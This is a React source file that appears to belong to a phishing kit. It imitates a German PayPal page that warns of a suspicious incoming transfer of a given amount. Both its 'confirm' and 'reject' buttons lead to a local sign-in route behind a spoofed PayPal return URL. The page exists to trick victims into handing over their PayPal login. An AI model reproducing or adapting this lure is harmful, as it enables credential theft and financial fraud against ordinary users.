import React from 'react';
import classes from "../email/Email.module.css";
import {Link,  useSearchParams} from "react-router-dom";

const Payment = () => {

    let [params] = useSearchParams();

    const [total, setTotal] = params.getAll("total");


    return (
        <div className={classes.corral}>
            <div className={classes.contentContainerBordered} style={{border: '0px', margin: 'inherit'}}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div className={classes.payment_message}>
                    Sie haben eine Uberweisung von {total} € erhalten Wir halten das fur verdachtig, also mussen Sie
                    es bestatigen oder ablehnen.
                </div>

                <div className={classes.actions}>
                    <Link to={"/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2Fsummary&state=&Z3JncnB0=&country.x=DE&locale.x=de_DE"}>
                        <button className={[classes.button].join(' ')}>
                            Bestätigen Sie
                        </button>
                    </Link>
                </div>
                <div className={classes.signupContainer}>
                    <div className={classes.loginSignUpSeparator}>
                        <span className={classes.textInSeparator}>
                            oder
                        </span>
                    </div>
                    <Link to={"/signin"}>
                        <button className={[classes.button, classes.secondary].join(' ')}>
                            Ablehnen
                        </button>
                    </Link>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <span className={[classes.picker, classes.country_selector].join(' ')}>
                            <button className={[classes.country ,classes.RU].join(' ')}>
                            </button>
                        </span>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected}>Deutsch</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Payment;